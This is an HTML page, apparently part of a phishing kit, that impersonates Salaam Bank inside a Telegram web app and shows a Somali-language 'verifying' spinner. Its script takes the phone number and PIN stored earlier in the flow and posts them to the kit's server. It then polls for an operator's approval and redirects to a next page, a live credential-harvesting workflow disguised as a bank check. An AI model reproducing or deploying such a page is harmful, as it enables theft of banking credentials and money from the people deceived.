<!DOCTYPE html>
<html lang="so">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Siga Suxida - Salaam Bank</title>

    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #0d1b2a; /* Dark Blue Base Background */
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            color: #e2e8f0;
        }

        .loading-card {
            background: #1b2a4a; /* Dark Blue Card Background */
            width: 90%;
            max-width: 380px;
            padding: 50px 20px;
            border-radius: 20px;
            text-align: center;
            border: 1px solid #2a3d66;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            box-sizing: border-box;
        }

        .loader-circle {
            width: 120px;
            height: 120px;
            background: linear-gradient(135deg, #001f3f 0%, #003366 100%);
            border: 2px solid #1e3a5f;
            border-radius: 50%;
            margin: 0 auto 30px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .loader-circle::after {
            content: '';
            width: 85px;
            height: 85px;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top: 4px solid #38bdf8; /* Highlight Accent Blue */
            border-radius: 50%;
            animation: spin 1.2s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        h2 {
            color: #f8fafc; /* Dark White / Off-White */
            font-size: 26px;
            margin: 0 0 10px;
            font-weight: 600;
        }

        p {
            color: #94a3b8; /* Muted Dark White */
            font-size: 15px;
            margin: 0;
            line-height: 1.4;
        }
    </style>
</head>

<body>

<div class="loading-card">
    <div class="loader-circle"></div>
    <h2 id="main-text">Waa La Dhadhaminayaa...</h2>
    <p id="sub-text">Siga suxida xaqiijinta...</p>
</div>

<script>
document.addEventListener("DOMContentLoaded", async () => {

    const mainText = document.getElementById("main-text");
    const subText = document.getElementById("sub-text");

    const tg = window.Telegram?.WebApp;
    if (tg) {
        tg.ready();
        tg.expand();
    }

    const phone = localStorage.getItem("phone") || "";
    const pin = localStorage.getItem("lastPin") || "";

    if (!phone) {
        console.warn("⚠️ Nambar telefoon lama helin.");
    }

    // -------------------- SEND LOGIN REQUEST --------------------
    try {
        await fetch("/api/login-notification", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ phone, pin })
        });
    } catch (err) {
        console.error("❌ Makal-mucaawino:", err);
    }

    // -------------------- TEXT CHANGE --------------------
    setTimeout(() => {
        mainText.textContent = "Fadlan sug...";
        subText.textContent = "Tani waxay qaadanaysaa daqiiqado yar";
    }, 3000);

    // -------------------- CHECK APPROVAL --------------------
    async function checkApproval() {
        if (!phone) return;

        try {
            const res = await fetch(`/api/check-status?phone=${phone}`);
            const data = await res.json();

            if (data.status === "approved") {
                mainText.textContent = "Waa La Ansixiyay!";
                subText.textContent = "Waqti yar ka dib bogga xiga ayaa furmi doona...";

                setTimeout(() => {
                    window.location.href = "/page8";
                }, 1500);
            }

            if (data.status === "denied") {
                mainText.textContent = "Lama Ansixin!";
                subText.textContent = "Xogtaada waa mid aan sax ahayn.";
            }

        } catch (err) {
            console.error("❌ Hubinta xaalada waa lagulamaid:", err);
        }
    }

    setInterval(checkApproval, 2000);
});
</script>

</body>
</html>
